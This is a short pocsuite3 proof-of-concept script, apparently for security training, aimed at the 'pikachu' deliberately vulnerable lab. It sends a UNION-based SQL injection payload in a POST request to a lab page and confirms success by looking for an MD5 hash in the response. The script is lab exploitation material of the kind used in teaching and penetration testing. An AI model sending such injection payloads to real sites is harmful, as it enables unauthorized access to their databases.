from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout

 
class DemoPOC(POCBase):
    vulID = '11001'  
    version = '3.0'
    author = ['Polaris']
    vulDate = '2020-5-14'
    createDate = '2020-5-14'
    updateDate = '2020-5-14'
    references = ['https://github.com/pikachu']
    name = 'pikachu'
    appPowerLink = ''
    appName = 'pikachu'
    appVersion = '1.x'
    vulType = 'SQL'
    desc = '''
    pikachu靶场post请求SQL注入
    '''
    samples = []
    install_requires = ['']
 
    def _verify(self):
#        output = Output(self)
        result = {}

        payload = {
        	'id' : "3 union select md5(123),2",
        	'submit' : "%E6%9F%A5%E8%AF%A2"
        }
        target = self.url+'/vul/sqli/sqli_id.php'
        response = requests.post(target,data=payload)

        try:
            if "202cb962ac59075b964b07152d234b70" in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except Exception as e:
            pass
 
        return self.parse_output(result)
 
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
 
    def _attack(self):
        return self._verify()
register_poc(DemoPOC)